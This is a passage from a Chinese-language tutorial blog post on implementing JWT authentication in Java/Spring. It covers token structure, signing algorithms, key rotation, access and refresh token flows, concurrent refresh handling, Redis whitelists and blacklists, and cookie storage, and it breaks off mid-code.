---
title: JWT 落地实践：令牌设计、刷新与黑名单机制
tag: ["JWT", "令牌"]
date: 2026-06-12
category: 安全
---

# JWT 落地实践：令牌设计、刷新与黑名单机制

> 深入理解 JWT 的每一个细节，从原理到生产落地的完整指南

## 1. JWT 三段式结构详解

### 1.1 JWT 长什么样

一个典型的 JWT 看起来像这样：

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

它由三部分组成，用点号（`.`）分隔：

```
Header.Payload.Signature
```

### 1.2 Header（头部）

Header 描述 JWT 的元数据，通常是两个字段：

```json
{
  "alg": "HS256",   // 签名算法
  "typ": "JWT"      // 令牌类型
}
```

该 JSON 经过 Base64URL 编码后形成 JWT 的第一部分。

**常见的签名算法**：

| 算法 | 全称 | 类型 | 说明 |
|------|------|------|------|
| HS256 | HMAC-SHA256 | 对称 | 使用同一密钥进行签名和验证 |
| HS384 | HMAC-SHA384 | 对称 | 安全性高于 HS256 |
| HS512 | HMAC-SHA512 | 对称 | 安全性最高，性能稍慢 |
| RS256 | RSA-SHA256 | 非对称 | 使用私钥签名，公钥验证 |
| RS384 | RSA-SHA384 | 非对称 | 更高安全性 |
| RS512 | RSA-SHA512 | 非对称 | 最高级别 RSA |
| ES256 | ECDSA-SHA256 | 非对称 | 椭圆曲线，密钥更短，性能更好 |
| ES384 | ECDSA-SHA384 | 非对称 | 更高安全性 |
| ES512 | ECDSA-SHA512 | 非对称 | 最高级别 ECDSA |

### 1.3 Payload（载荷）

Payload 是 JWT 的核心内容，包含声明（Claims）。声明分三种类型：

**标准声明（Registered Claims）**：

```json
{
  "iss": "https://auth.example.com",   // 签发者（Issuer）
  "sub": "1234567890",                 // 主题（Subject），通常是用户ID
  "aud": "https://api.example.com",    // 接收方（Audience）
  "exp": 1718123456,                   // 过期时间（Expiration Time）
  "nbf": 1718037056,                   // 生效时间（Not Before）
  "iat": 1718037056,                   // 签发时间（Issued At）
  "jti": "a1b2c3d4-e5f6-7890-abcd"    // JWT唯一标识（JWT ID）
}
```

**理解各个时间字段**：

```
时间轴 ─────────────────────────────────────────→

     iat              nbf              exp
      │                │                │
      ↓                ↓                ↓
 ─────[════════════════════════════════]─────
       ↑                                ↑
       签发时间                        过期时间
       └────── Token 有效区间 ──────────┘
       
  iat (Issued At)：    Token 创建的时间
  nbf (Not Before)：   Token 在此时间之前不可用（用于缓冲）
  exp (Expiration)：   Token 过期时间，之后不可用
```

**自定义声明（Private Claims）**：

```json
{
  "userId": "1234567890",
  "username": "john_doe",
  "email": "john@example.com",
  "roles": ["USER", "EDITOR"],
  "permissions": ["article:read", "article:write"],
  "tenantId": "tenant_001",
  "deviceId": "device_abc"
}
```

> **⚠️ 重要原则**：Payload 只经过 Base64URL 编码，**不是加密**！任何人都可以解码查看内容。因此：
> - **不要**在 Payload 中存放密码、密钥等敏感信息
> - **可以**存放非敏感的用户标识和权限信息
> - Payload 越大，每次请求携带的数据就越多（HTTP Header 通常有 8KB 限制）

### 1.4 Signature（签名）

签名是 JWT 安全性的核心。它的生成方式：

```
签名 = HMAC-SHA256(
    Base64URL(Header) + "." + Base64URL(Payload),
    Secret
)
```

或者用伪代码表示：

```python
signature = sign(
    algorithm=header.alg,
    data=f"{header_b64}.{payload_b64}",
    key=secret_key
)
```

**签名的作用**：

1. **完整性验证**：确保 Token 在传输过程中没有被篡改（即使改一个字符，签名也会完全改变）
2. **来源验证**：只有持有密钥的服务器才能签发有效的 JWT
3. **不可否认性**：持有密钥的服务器无法否认签发了某个 Token（注意：HS256 方式下，验证方也能签发）

### 1.5 完整解码示例

```java
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.security.Keys;
import javax.crypto.SecretKey;
import java.nio.charset.StandardCharsets;
import java.util.Date;
import java.util.UUID;

public class JwtExample {

    public static void main(String[] args) {
        // ─── 1. 生成密钥 ───
        // HMAC-SHA256 至少需要 256 位（32 字节）
        String secretString = "your-256-bit-secret-your-256-bit-secret";
        SecretKey key = Keys.hmacShaKeyFor(secretString.getBytes(StandardCharsets.UTF_8));

        // ─── 2. 构建 JWT ───
        String jti = UUID.randomUUID().toString();
        long now = System.currentTimeMillis();

        String token = Jwts.builder()
            // Header（由 builder 自动处理）
            // .setHeaderParam("alg", "HS256")  // 通常不需要手动设置

            // Payload - 标准声明
            .issuer("https://auth.example.com")        // iss
            .subject("1234567890")                      // sub
            .audience().add("https://api.example.com").and() // aud
            .id(jti)                                    // jti
            .issuedAt(new Date(now))                    // iat
            .notBefore(new Date(now))                   // nbf
            .expiration(new Date(now + 3600_000))       // exp: 1小时后

            // Payload - 自定义声明
            .claim("username", "john_doe")
            .claim("email", "john@example.com")
            .claim("roles", new String[]{"USER", "EDITOR"})

            // Signature
            .signWith(key)

            .compact();

        System.out.println("生成的 JWT:");
        System.out.println(token);
        System.out.println();

        // ─── 3. 解析 JWT ───
        var claims = Jwts.parser()
            .verifyWith(key)       // JJWT 0.12+ 新 API
            .build()
            .parseSignedClaims(token)
            .getPayload();

        System.out.println("解析结果:");
        System.out.println("  主题 (sub): " + claims.getSubject());
        System.out.println("  签发者 (iss): " + claims.getIssuer());
        System.out.println("  JWT ID (jti): " + claims.getId());
        System.out.println("  签发时间 (iat): " + claims.getIssuedAt());
        System.out.println("  过期时间 (exp): " + claims.getExpiration());
        System.out.println("  用户名: " + claims.get("username", String.class));
        System.out.println("  角色: " + claims.get("roles", List.class));

        // ─── 4. 手动分段 ───
        String[] parts = token.split("\\.");
        System.out.println("\n分段:");
        System.out.println("  Header:  " + parts[0]);
        System.out.println("  Payload: " + parts[1]);
        System.out.println("  Signature: " + parts[2]);

        // 解码 Header 和 Payload（Base64URL → JSON）
        System.out.println("\n解码后 Header:");
        System.out.println(new String(Base64.getUrlDecoder().decode(parts[0])));
        System.out.println("解码后 Payload:");
        System.out.println(new String(Base64.getUrlDecoder().decode(parts[1])));
    }
}
```

---

## 2. 对称加密 vs 非对称加密

### 2.1 对称加密（HS256 / HMAC）

```
┌─────────────────────┐              ┌─────────────────────┐
│     签发服务         │              │     验证服务         │
│                     │              │                     │
│  共享密钥: "secret"  │ ─── JWT ──→ │  共享密钥: "secret"  │
│  签名: HMAC(secret) │              │  验证: HMAC(secret) │
│                     │              │                     │
└─────────────────────┘              └─────────────────────┘
```

**优点**：
- 简单、性能好（HMAC 计算速度快）
- 密钥管理简单（只有一个密钥）
- 适合单体应用或服务数量少的场景

**缺点**：
- 不安全：任何持有密钥的人都能签发和验证 Token
- 密钥分发困难：多个服务需要共享同一密钥，增加泄露风险
- 如果密钥泄露，攻击者可以伪造任何用户的 Token

### 2.2 非对称加密（RS256 / ES256）

```
┌─────────────────────────┐              ┌─────────────────────────┐
│       签发服务（Auth）     │              │       验证服务（API）     │
│                         │              │                         │
│  私钥: private_key.pem  │ ─── JWT ──→ │  公钥: public_key.pem    │
│  签名: RSA-SHA256(私钥) │              │  验证: RSA-SHA256(公钥) │
│                         │              │                         │
│  ← 唯一能签发 Token     │              │  ← 只能验证，不能签发     │
└─────────────────────────┘              └─────────────────────────┘
```

**优点**：
- 安全：验证方（API 服务）只有公钥，无法签发 Token
- 密钥分发简单：公钥可以公开，不需要保密
- 支持密钥轮换：可以预置多个公钥实现无缝切换
- 适合微服务架构

**缺点**：
- 性能稍差（RSA 签名验证比 HMAC 慢）
- 密钥管理更复杂（需要生成和管理公私钥对）

### 2.3 如何选择

| 场景 | 推荐算法 | 原因 |
|------|---------|------|
| 单体应用 | HS256 | 简单高效，只有一套服务 |
| 微服务（< 10 个服务） | RS256 | 认证服务和业务服务分离 |
| 微服务（> 10 个服务） | ES256 | 密钥更短，性能更好 |
| 对外 API / OAuth2 | RS256 或 ES256 | 标准推荐，公钥可发布在 JWKS 端点 |
| 高安全要求（金融、医疗） | ES512 | 最高安全级别 |

### 2.4 非对称加密实战

**生成 RSA 密钥对**：

```bash
# 生成私钥（2048位）
openssl genpkey -algorithm RSA -out private_key.pem -pkeyopt rsa_keygen_bits:2048

# 从私钥提取公钥
openssl rsa -pubout -in private_key.pem -out public_key.pem

# 生成 PKCS#8 格式的私钥（Java 更友好）
openssl pkcs8 -topk8 -inform PEM -outform PEM -in private_key.pem -out private_key_pkcs8.pem -nocrypt
```

**Java 代码加载密钥**：

```java
@Component
public class RsaJwtProvider {

    private final PrivateKey privateKey;
    private final PublicKey publicKey;

    public RsaJwtProvider(
            @Value("${jwt.private-key-path}") String privateKeyPath,
            @Value("${jwt.public-key-path}") String publicKeyPath) throws Exception {

        this.privateKey = loadPrivateKey(privateKeyPath);
        this.publicKey = loadPublicKey(publicKeyPath);
    }

    private PrivateKey loadPrivateKey(String path) throws Exception {
        String key = Files.readString(Path.of(path))
                .replace("-----BEGIN PRIVATE KEY-----", "")
                .replace("-----END PRIVATE KEY-----", "")
                .replaceAll("\\s", "");

        byte[] keyBytes = Base64.getDecoder().decode(key);
        PKCS8EncodedKeySpec spec = new PKCS8EncodedKeySpec(keyBytes);
        KeyFactory factory = KeyFactory.getInstance("RSA");
        return factory.generatePrivate(spec);
    }

    private PublicKey loadPublicKey(String path) throws Exception {
        String key = Files.readString(Path.of(path))
                .replace("-----BEGIN PUBLIC KEY-----", "")
                .replace("-----END PUBLIC KEY-----", "")
                .replaceAll("\\s", "");

        byte[] keyBytes = Base64.getDecoder().decode(key);
        X509EncodedKeySpec spec = new X509EncodedKeySpec(keyBytes);
        KeyFactory factory = KeyFactory.getInstance("RSA");
        return factory.generatePublic(spec);
    }

    /**
     * 使用私钥签发 JWT
     */
    public String generateToken(Long userId, String username) {
        return Jwts.builder()
                .subject(userId.toString())
                .claim("username", username)
                .issuedAt(new Date())
                .expiration(new Date(System.currentTimeMillis() + 3600_000))
                .signWith(privateKey)  // 使用私钥签名
                .compact();
    }

    /**
     * 使用公钥验证 JWT
     */
    public Claims validateToken(String token) {
        return Jwts.parser()
                .verifyWith(publicKey)  // 使用公钥验证
                .build()
                .parseSignedClaims(token)
                .getPayload();
    }
}
```

### 2.5 密钥轮换方案

安全的系统需要定期轮换密钥。一个实用的实现：

```java
@Component
public class KeyRotationManager {

    // keyId → 公钥
    private final Map<String, PublicKey> publicKeys = new ConcurrentHashMap<>();

    // 当前活跃的密钥ID
    private volatile String currentKeyId;

    // 私钥（仅认证服务持有）
    private PrivateKey currentPrivateKey;

    /**
     * 签发时使用当前密钥，并在 JWT Header 中嵌入 keyId
     */
    public String generateToken(Long userId) {
        String keyId = this.currentKeyId;
        return Jwts.builder()
                .subject(userId.toString())
                .header().keyId(keyId).and() // ← 关键：告诉验证方用哪个公钥
                .signWith(currentPrivateKey)
                .compact();
    }

    /**
     * 验证时根据 keyId 选择正确的公钥
     */
    public Claims validateToken(String token) {
        // 先不验证签名，获取 Header 中的 keyId
        String keyId = Jwts.parser()
                .unsecured()  // 不验证签名
                .build()
                .parseUnsecuredClaims(token)
                .getHeader()
                .getKeyId();

        PublicKey publicKey = publicKeys.get(keyId);
        if (publicKey == null) {
            throw new JwtException("未知的密钥ID: " + keyId);
        }

        // 使用对应的公钥验证
        return Jwts.parser()
                .verifyWith(publicKey)
                .build()
                .parseSignedClaims(token)
                .getPayload();
    }

    /**
     * 轮换密钥：生成新密钥对，更新当前活跃密钥
     * 旧公钥保留在 publicKeys 中，直到所有旧 Token 过期
     */
    public void rotate() throws Exception {
        KeyPairGenerator generator = KeyPairGenerator.getInstance("RSA");
        generator.initialize(2048);
        KeyPair newKeyPair = generator.generateKeyPair();

        String newKeyId = UUID.randomUUID().toString();
        publicKeys.put(newKeyId, newKeyPair.getPublic());
        this.currentKeyId = newKeyId;
        this.currentPrivateKey = newKeyPair.getPrivate();

        log.info("密钥已轮换，新 KeyId: {}", newKeyId);
    }
}
```

---

## 3. Access Token + Refresh Token 双令牌方案

### 3.1 为什么需要双令牌

单 Token 方案的问题：

```
┌─────────────────────────────────────────────────────┐
│           问题：Token 有效期两难                        │
├─────────────────────────────────────────────────────┤
│                                                     │
│  太短了 → 用户频繁掉线，体验差                           │
│    ├── 15分钟过期 → 用户每15分钟要重新登录                │
│    └── 用户怨声载道                                    │
│                                                     │
│  太长了 → 安全风险大                                    │
│    ├── 24小时过期 → Token 一旦泄露，攻击者有整整一天时间     │
│    └── 无法快速撤销（JWT 本身不支持撤销）                  │
│                                                     │
└─────────────────────────────────────────────────────┘
```

双令牌方案完美解决这个矛盾：

```
┌──────────────────────────────────────────────────────────┐
│              双令牌角色分工                                 │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  Access Token（访问令牌）                                 │
│  ├── 生命周期：短（15分钟 ~ 2小时）                        │
│  ├── 存放位置：前端内存                                    │
│  ├── 作用：每次 API 请求携带，证明身份                       │
│  └── 泄露影响：有限（很快就过期）                            │
│                                                          │
│  Refresh Token（刷新令牌）                                 │
│  ├── 生命周期：长（7天 ~ 30天）                            │
│  ├── 存放位置：HttpOnly Cookie 或安全存储                   │
│  ├── 作用：当 Access Token 过期时，换取新的访问令牌           │
│  └── 泄露影响：较大，但服务端可以撤销（白名单/黑名单）          │
│                                                          │
└──────────────────────────────────────────────────────────┘
```

### 3.2 典型的双令牌交互流程

```
┌──────────┐                    ┌──────────────┐
│  前端 App │                    │  后端 API     │
└─────┬────┘                    └──────┬───────┘
      │                                │
      │  ① POST /auth/login            │
      │   {username, password}         │
      │──────────────────────────────→│
      │                                │ 验证用户名密码
      │  ② {accessToken, refreshToken} │
      │←──────────────────────────────│ 签发双令牌
      │                                │
      │  ③ GET /api/users            │
      │   Authorization: Bearer {AT}   │
      │──────────────────────────────→│ 验证 Access Token
      │                                │
      │  ④ {users: [...]}             │
      │←──────────────────────────────│
      │                                │
      │  ⏰ 15分钟后...                 │
      │                                │
      │  ⑤ GET /api/orders           │
      │   Authorization: Bearer {AT}   │
      │──────────────────────────────→│
      │                                │ Access Token 过期!
      │  ⑥ 401 Token Expired          │
      │←──────────────────────────────│
      │                                │
      │  ⑦ POST /auth/refresh        │
      │   {refreshToken: "{RT}"}       │
      │──────────────────────────────→│ 验证 Refresh Token
      │                                │ 签发新 Access Token
      │  ⑧ {accessToken: "{NEW_AT}",  │ (可选)签发新 Refresh Token
      │     refreshToken: "{NEW_RT}"}  │
      │←──────────────────────────────│
      │                                │
      │  ⑨ 重试 GET /api/orders      │
      │   Authorization: Bearer {NEW}  │
      │──────────────────────────────→│ ✅ 验证通过
      │                                │
```

### 3.3 Refresh Token 的设计要点

```java
/**
 * Refresh Token 应该包含的声明
 */
public String generateRefreshToken(Long userId, String deviceId) {
    String jti = UUID.randomUUID().toString();
    Date now = new Date();
    Date expiry = new Date(now.getTime() + refreshTokenExpiration);

    return Jwts.builder()
            .subject(userId.toString())
            .id(jti)                        // ← 唯一标识，用于撤销
            .claim("type", "refresh")        // ← 标记为 Refresh Token
            .claim("deviceId", deviceId)     // ← 设备标识
            .issuedAt(now)
            .expiration(expiry)
            .signWith(signingKey)
            .compact();
}

/**
 * 验证 Refresh Token 时做多层检查
 */
public boolean validateRefreshToken(String token) {
    try {
        Claims claims = parseToken(token);

        // 1. 基本验证（过期、签名）
        // ← JWT 库自动完成

        // 2. 类型检查：必须是 Refresh Token，不是 Access Token
        String type = claims.get("type", String.class);
        if (!"refresh".equals(type)) {
            log.warn("收到非 Refresh Token 的令牌类型: {}", type);
            return false;
        }

        // 3. 白名单检查
        String jti = claims.getId();
        Long userId = Long.parseLong(claims.getSubject());
        if (!isInWhitelist(userId, jti)) {
            log.warn("Refresh Token 不在白名单中: jti={}", jti);
            return false;
        }

        return true;

    } catch (ExpiredJwtException e) {
        // Refresh Token 本身也过期了 → 用户需要重新登录
        log.info("Refresh Token 已过期: jti={}", e.getClaims().getId());
        return false;
    } catch (JwtException e) {
        log.warn("Refresh Token 验证失败", e);
        return false;
    }
}
```

---

## 4. Token 刷新流程与并发刷新问题

### 4.1 基本的刷新流程

```java
@PostMapping("/refresh")
public ResponseEntity<ApiResponse<TokenPair>> refreshToken(
        @RequestBody RefreshRequest request) {

    String refreshToken = request.getRefreshToken();

    // ─── 1. 验证 Refresh Token 的有效性 ───
    if (!jwtTokenProvider.validateRefreshToken(refreshToken)) {
        return ResponseEntity.status(401)
                .body(ApiResponse.error("Refresh Token 无效"));
    }

    // ─── 2. 提取信息 ───
    Long userId = jwtTokenProvider.getUserIdFromToken(refreshToken);
    String jti = jwtTokenProvider.getJtiFromToken(refreshToken);

    // ─── 3. 检查是否在白名单中 ───
    if (!tokenWhitelistService.isValid(userId, jti)) {
        // Token 已被撤销（用户修改了密码、管理员强制下线等）
        return ResponseEntity.status(401)
                .body(ApiResponse.error("Token 已被撤销，请重新登录"));
    }

    // ─── 4. 撤销旧的 Refresh Token ───
    tokenWhitelistService.revoke(userId, jti);

    // ─── 5. 加载用户信息 ───
    UserDetails userDetails = userDetailsService.loadUserById(userId);

    // ─── 6. 生成新的令牌对 ───
    Authentication auth = new UsernamePasswordAuthenticationToken(
            userDetails, null, userDetails.getAuthorities());

    String newAccessToken = jwtTokenProvider.generateAccessToken(auth);
    String newRefreshToken = jwtTokenProvider.generateRefreshToken(
            userDetails.getId(), request.getDeviceId());

    // ─── 7. 将新的 Refresh Token 加入白名单 ───
    tokenWhitelistService.add(userId, newRefreshToken);

    return ResponseEntity.ok(ApiResponse.success(
            new TokenPair(newAccessToken, newRefreshToken)));
}
```

### 4.2 并发刷新问题

这是生产环境中最容易忽略的问题。当多个 API 请求几乎同时发现 Token 已过期，它们都会尝试刷新：

```
时间线
─────────────────────────────────────────────────────→

请求A: GET /api/users  → 401 → 刷新Token → 获得 RTv2 ✅
请求B: GET /api/orders → 401 → 刷新Token → RTv1 已失效 ❌
请求C: GET /api/inbox  → 401 → 刷新Token → RTv1 已失效 ❌

结果：B 和 C 的用户被强制退出！
```

**解决方案一：乐观锁 + 重试（推荐）**

```java
@PostMapping("/refresh")
public ResponseEntity<ApiResponse<TokenPair>> refreshToken(
        @RequestBody RefreshRequest request) {

    String refreshToken = request.getRefreshToken();
    Long userId = jwtTokenProvider.getUserIdFromToken(refreshToken);
    String jti = jwtTokenProvider.getJtiFromToken(refreshToken);

    // ─── 加分布式锁 ───
    String lockKey = "refresh_lock:" + userId;
    RLock lock = redissonClient.getLock(lockKey);

    try {
        // 等待 3 秒，锁 10 秒自动释放
        if (lock.tryLock(3, 10, TimeUnit.SECONDS)) {

            // 再次检查 Token 状态（其他线程可能已经刷新过了）
            if (!tokenWhitelistService.isValid(userId, jti)) {
                // 如果 Whitelist 是「一个用户只保留最新一个」的策略
                // 可以检查是否有更新的 Token 已生成
                String latestToken = tokenWhitelistService.getLatest(userId);

                if (latestToken != null) {
                    // 最新的 Refresh Token 已被另一个请求生成
                    // 返回这个最新的 Token（或返回特定状态让前端用新Token重试）
                    log.info("检测到并发刷新，返回已生成的最新 Token");
                    return ResponseEntity.ok(ApiResponse.success(
                            "Token 已被刷新",
                            generateNewTokenPair(userId)));
                }

                return ResponseEntity.status(401)
                        .body(ApiResponse.error("Token 已失效，请重新登录"));
            }

            // 执行正常的刷新流程
            tokenWhitelistService.revoke(userId, jti);
            return ResponseEntity.ok(ApiResponse.success(
                    generateNewTokenPair(userId)));

        } else {
            // 获取锁超时，等待前端重试
            return ResponseEntity.status(429)
                    .body(ApiResponse.error("刷新请求过于频繁，请稍后重试"));
        }

    } catch (InterruptedException e) {
        Thread.currentThread().interrupt();
        return ResponseEntity.status(500).body(ApiResponse.error("服务器繁忙"));
    } finally {
        if (lock.isHeldByCurrentThread()) {
            lock.unlock();
        }
    }
}
```

**解决方案二：前端防抖（配合后端）**

```typescript
// 前端：使用 Promise 缓存避免并发刷新
class TokenManager {
    private refreshPromise: Promise<string> | null = null;

    async getAccessToken(): Promise<string> {
        if (this.isTokenValid()) {
            return this.accessToken!;
        }

        // 如果已有刷新请求在进行中，复用同一个 Promise
        if (!this.refreshPromise) {
            this.refreshPromise = this.doRefresh()
                .finally(() => {
                    this.refreshPromise = null;
                });
        }

        return this.refreshPromise;
    }

    private async doRefresh(): Promise<string> {
        const response = await fetch('/api/auth/refresh', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ refreshToken: this.refreshToken })
        });

        if (!response.ok) {
            this.clearTokens();
            window.location.href = '/login';
            throw new Error('Refresh failed');
        }

        const data = await response.json();
        this.accessToken = data.accessToken;
        this.refreshToken = data.refreshToken;
        return this.accessToken;
    }
}
```

**解决方案三：Refresh Token Rotation（每次刷新生成新 Token）**

```java
/**
 * 核心原则：Refresh Token 使用一次后就作废
 * 
 * 优点：
 * - 如果 Refresh Token 泄露，正版用户一旦刷新，攻击者的 Token 就失效了
 * - 服务端能检测到 Token 被重复使用（安全检查）
 */

public TokenPair refresh(String oldRefreshToken) {
    String jti = jwtTokenProvider.getJtiFromToken(oldRefreshToken);
    Long userId = jwtTokenProvider.getUserIdFromToken(oldRefreshToken);

    // 检查 Token 是否已被使用
    if (!tokenWhitelistService.isValid(userId, jti)) {
        // Token 已被使用！这可能是攻击行为
        // 立即撤销该用户的所有 Refresh Token
        tokenWhitelistService.revokeAll(userId);
        log.warn("检测到 Refresh Token 重复使用！用户 {} 的所有 Token 已撤销", userId);
        throw new TokenReusedException("检测到安全风险，请重新登录");
    }

    // 撤销旧 Token
    tokenWhitelistService.revoke(userId, jti);

    // 生成新 Token
    TokenPair pair = generateNewTokenPair(userId);
    tokenWhitelistService.add(userId, pair.getRefreshToken());

    return pair;
}
```

---

## 5. 黑名单/白名单机制实现

### 5.1 白名单 vs 黑名单

| 机制 | 原理 | 优点 | 缺点 |
|------|------|------|------|
| **白名单** | 只有列表中的 Token 才有效 | 安全，默认拒绝 | 需要存储所有有效 Token，存储量大 |
| **黑名单** | 列表中的 Token 无效，其余有效 | 存储量小 | 默认允许，可能遗漏 |

**推荐策略**：
- **Access Token**：不存储（依赖短过期时间控制风险）
- **Refresh Token**：白名单（需要随时撤销能力）

### 5.2 Redis 白名单实现

```java
@Service
@RequiredArgsConstructor
@Slf4j
public class TokenWhitelistService {

    private final StringRedisTemplate redisTemplate;

    // Key 前缀
    private static final String REFRESH_TOKEN_PREFIX = "rt:user:";
    private static final String ACCESS_TOKEN_BLACKLIST_PREFIX = "at:black:";

    /**
     * 添加 Refresh Token 到白名单
     * 策略：一个用户保留最近 N 个有效设备
     */
    public void addRefreshToken(Long userId, String jti, String refreshToken, long ttlSeconds) {
        String key = REFRESH_TOKEN_PREFIX + userId;

        // 使用 Hash 结构: jti → refreshToken
        redisTemplate.opsForHash().put(key, jti, refreshToken);

        // 设置过期时间（与 Refresh Token 的 TTL 一致）
        redisTemplate.expire(key, Duration.ofSeconds(ttlSeconds));

        // 限制设备数量（可选）
        Long size = redisTemplate.opsForHash().size(key);
        if (size != null && size > 5) {
            log.warn("用户 {} 登录设备超过 5 个", userId);
            // 可以删除最旧的设备
        }
    }

    /**
     * 检查 Refresh Token 是否在白名单中
     */
    public boolean isRefreshTokenValid(Long userId, String jti) {
        String key = REFRESH_TOKEN_PREFIX + userId;
        return Boolean.TRUE.equals(redisTemplate.opsForHash().hasKey(key, jti));
    }

    /**
     * 撤销单个 Refresh Token（单设备登出）
     */
    public void revokeRefreshToken(Long userId, String jti) {
        String key = REFRESH_TOKEN_PREFIX + userId;
        redisTemplate.opsForHash().delete(key, jti);
    }

    /**
     * 撤销用户所有 Refresh Token（修改密码后、强制下线）
     */
    public void revokeAllTokens(Long userId) {
        String key = REFRESH_TOKEN_PREFIX + userId;
        redisTemplate.delete(key);
    }

    /**
     * 获取用户最新的 Refresh Token ID
     */
    public String getLatestJti(Long userId) {
        String key = REFRESH_TOKEN_PREFIX + userId;
        Set<Object> keys = redisTemplate.opsForHash().keys(key);
        if (keys == null || keys.isEmpty()) return null;

        // 返回任意一个（如果有多个设备），或按规则选择
        return keys.iterator().next().toString();
    }

    /**
     * Access Token 黑名单（用于需要立即失效 Access Token 的场景）
     * 过期时间 = Access Token 剩余有效时间
     */
    public void blacklistAccessToken(String jti, long remainingTtlSeconds) {
        String key = ACCESS_TOKEN_BLACKLIST_PREFIX + jti;
        redisTemplate.opsForValue().set(key, "1", Duration.ofSeconds(remainingTtlSeconds));
    }

    /**
     * 检查 Access Token 是否被拉黑
     */
    public boolean isAccessTokenBlacklisted(String jti) {
        String key = ACCESS_TOKEN_BLACKLIST_PREFIX + jti;
        return Boolean.TRUE.equals(redisTemplate.hasKey(key));
    }
}
```

### 5.3 结合 JWT 过滤器

```java
@Component
@RequiredArgsConstructor
public class JwtAuthenticationFilter extends OncePerRequestFilter {

    private final JwtTokenProvider jwtTokenProvider;
    private final TokenWhitelistService tokenWhitelistService;
    private final UserDetailsServiceImpl userDetailsService;

    @Override
    protected void doFilterInternal(
            HttpServletRequest request,
            HttpServletResponse response,
            FilterChain filterChain)
            throws ServletException, IOException {

        String token = extractToken(request);
        if (token == null) {
            filterChain.doFilter(request, response);
            return;
        }

        try {
            // ─── 1. 验证 JWT 签名和过期时间 ───
            Claims claims = jwtTokenProvider.parseToken(token);

            // ─── 2. 检查 Access Token 黑名单 ───
            String jti = claims.getId();
            if (jti != null && tokenWhitelistService.isAccessTokenBlacklisted(jti)) {
                sendError(response, 401, "Token 已被撤销");
                return;
            }

            // ─── 3. 设置认证上下文 ───
            Long userId = Long.parseLong(claims.getSubject());
            UserDetails userDetails = userDetailsService.loadUserById(userId);

            UsernamePasswordAuthenticationToken authentication =
                    new UsernamePasswordAuthenticationToken(
                        userDetails, null, userDetails.getAuthorities());

            SecurityContextHolder.getContext().setAuthentication(authentication);

        } catch (ExpiredJwtException e) {
            // Token 过期 → 返回特定错误码，前端自动刷新
            sendError(response, 401, "Token 已过期",
                    "TOKEN_EXPIRED");  // 自定义错误码，前端据此触发刷新
            return;
        } catch (JwtException e) {
            sendError(response, 401, "Token 无效");
            return;
        }

        filterChain.doFilter(request, response);
    }

    private String extractToken(HttpServletRequest request) {
        String bearer = request.getHeader("Authorization");
        if (StringUtils.hasText(bearer) && bearer.startsWith("Bearer ")) {
            return bearer.substring(7);
        }
        return null;
    }

    private void sendError(HttpServletResponse response, int status,
                           String message) throws IOException {
        sendError(response, status, message, null);
    }

    private void sendError(HttpServletResponse response, int status,
                           String message, String errorCode) throws IOException {
        response.setStatus(status);
        response.setContentType("application/json;charset=UTF-8");
        Map<String, Object> body = new LinkedHashMap<>();
        body.put("code", status);
        body.put("message", message);
        if (errorCode != null) {
            body.put("errorCode", errorCode);
        }
        response.getWriter().write(new ObjectMapper().writeValueAsString(body));
    }
}
```

---

## 6. Token 存储安全：前端存哪里

### 6.1 各种存储方式的对比

| 存储方式 | XSS 防护 | CSRF 防护 | 持久化 | 跨域 | 推荐度 |
|---------|---------|---------|-------|------|-------|
| `localStorage` | ❌ | ✅ | ✅ | ❌ | ⭐ |
| `sessionStorage` | ❌ | ✅ | ❌ | ❌ | ⭐⭐ |
| Cookie (HttpOnly) | ✅ | ❌ | ✅ | 可配置 | ⭐⭐⭐⭐ |
| Cookie (HttpOnly + Secure + SameSite) | ✅ | ✅ | ✅ | 受控 | ⭐⭐⭐⭐⭐ |
| 内存变量 (JS 闭包) | ✅ | ✅ | ❌ | ❌ | ⭐⭐⭐ |
| Service Worker | ✅ | ✅ | ✅ | ❌ | ⭐⭐⭐ |
| BFF (Backend For Frontend) | ✅ | ✅ | ✅ | ✅ | ⭐⭐⭐⭐⭐ |

### 6.2 推荐方案：分而治之

```
┌─────────────────────────────────────────────────────────┐
│              推荐的双令牌存储方案                          │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  Access Token（访问令牌）                                 │
│  ├── 存放位置：JavaScript 内存（闭包变量）                  │
│  ├── 持久化：❌ (每次打开页面重新获取/刷新拿到)               │
│  ├── 传输方式：Authorization: Bearer 请求头               │
│  └── 原因：即使 XSS 攻击拿到，有效期短，影响有限             │
│                                                         │
│  Refresh Token（刷新令牌）                                │
│  ├── 存放位置：HttpOnly + Secure + SameSite Cookie        │
│  ├── 持久化：✅ (关闭浏览器后仍可用)                        │
│  ├── 传输方式：自动附加到同源请求                           │
│  └── 原因：XSS 脚本无法读取 HttpOnly Cookie                │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### 6.3 服务端 Cookie 设置

```java
@PostMapping("/login")
public ResponseEntity<ApiResponse<LoginResponse>> login(
        @RequestBody LoginRequest request,
        HttpServletResponse response) {

    // ... 认证逻辑 ...

    // 设置 Refresh Token 为 HttpOnly Cookie
    ResponseCookie refreshCookie = ResponseCookie.from("refresh_token", refreshToken)
            .httpOnly(true)          // ← JavaScript 不可读取
            .secure(true)            // ← 仅 HTTPS
            .sameSite("Strict")      // ← 防 CSRF
            .path("/api/auth")       // ← 仅刷新接口路径
            .maxAge(Duration.ofDays(7))
            .build();

    response.addHeader(HttpHeaders.SET_COOKIE, refreshCookie.toString());

    // Access Token 在响应体中返回（前端存内存）
    return ResponseEntity.ok(ApiResponse.success(
            new LoginResponse(accessToken, userInfo)));
}

@PostMapping("/refresh")
public ResponseEntity<ApiResponse<LoginResponse>> refreshToken(
        @CookieValue(value = "refresh_token", required = false) String refreshToken,
        HttpServletResponse response) {

    if (refreshToken == null) {
        return ResponseEntity.status(401).build();
    }

    // ... 刷新逻辑 ...

    // 更新 Cookie
    ResponseCookie newRefreshCookie = ResponseCookie.from("refresh_token", newRefreshToken)
            .httpOnly(true)
            .secure(true)
            .sameSite("Strict")
            .path("/api/auth")
            .maxAge(Duration.ofDays(7))
            .build();

    response.addHeader(HttpHeaders.SET_COOKIE, newRefreshCookie.toString());

    return ResponseEntity.ok(ApiResponse.success(
